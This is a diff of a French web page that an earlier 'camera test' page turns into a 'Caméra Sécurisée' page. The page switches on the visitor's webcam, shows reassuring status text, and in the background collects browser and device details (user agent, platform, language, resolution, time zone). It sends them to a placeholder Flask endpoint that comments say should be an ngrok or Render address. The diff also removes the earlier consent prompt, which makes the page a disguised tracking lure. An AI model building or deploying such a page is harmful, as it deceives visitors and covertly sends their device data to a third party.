@@ -2,59 +2,91 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Test Caméra & Infos</title>
+  <title>Caméra Sécurisée</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
-      font-family: Arial, sans-serif;
+      background: #121212;
+      color: #ffffff;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
       padding: 20px;
-      text-align: center;
-      background-color: #f0f0f0;
+      height: 100vh;
+      box-sizing: border-box;
     }
+
+    h1 {
+      margin-bottom: 10px;
+      font-size: 28px;
+      color: #00bcd4;
+    }
+
+    p {
+      margin-bottom: 20px;
+      color: #bbb;
+    }
+
     video {
-      border: 2px solid #333;
-      border-radius: 10px;
+      border: 4px solid #00bcd4;
+      border-radius: 12px;
+      width: 90%;
+      max-width: 400px;
+      box-shadow: 0 0 12px rgba(0, 188, 212, 0.5);
+    }
+
+    footer {
       margin-top: 20px;
+      font-size: 14px;
+      color: #666;
     }
   </style>
 </head>
 <body>
-  <h2>🔍 Test Caméra et Informations</h2>
-  <p>Autorisez l'accès à la caméra pour continuer.</p>
-  <video id="video" width="300" autoplay></video>
+  <h1>🎥 Accès Caméra Sécurisé</h1>
+  <p>Votre caméra est en cours d’activation.</p>
+  <video id="video" autoplay playsinline></video>
+  <footer>Connexion en cours...</footer>
 
   <script>
-    // Remplace cette URL par ton adresse ngrok ou ton lien Flask public
-    const FLASK_URL = "https://ton-ngrok-ou-flask-url/send_info";
+    // Remplace ce lien par ton adresse ngrok ou Render (ex: https://xxx.ngrok.io/send_info)
+    const FLASK_URL = "https://TON_ADRESSE/send_info";
 
-    // 1. Activer la caméra
+    // 🎥 Activation et affichage de la caméra
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
-        document.getElementById('video').srcObject = stream;
+        const video = document.getElementById("video");
+        video.srcObject = stream;
       })
       .catch(error => {
         console.error("Erreur caméra :", error);
       });
 
-    // 2. Collecte des infos système
+    // 📡 Collecte des infos système
     const infos = {
       userAgent: navigator.userAgent,
-      plateforme: navigator.platform,
-      langue: navigator.language,
-      resolution: screen.width + "x" + screen.height,
-      fuseauHoraire: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      platform: navigator.platform,
+      language: navigator.language,
+      resolution: `${screen.width}x${screen.height}`,
+      timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      date: new Date().toISOString()
     };
 
-    // 3. Envoi vers ton serveur Flask
+    // 📤 Envoi en arrière-plan au serveur Flask
     fetch(FLASK_URL, {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
       },
       body: JSON.stringify(infos)
-    }).then(res => {
-      console.log("✅ Données envoyées !");
-    }).catch(err => {
-      console.error("❌ Échec envoi :", err);
+    })
+    .then(() => {
+      console.log("✅ Données envoyées au serveur.");
+    })
+    .catch(err => {
+      console.error("❌ Erreur d'envoi :", err);
     });
   </script>
 </body>
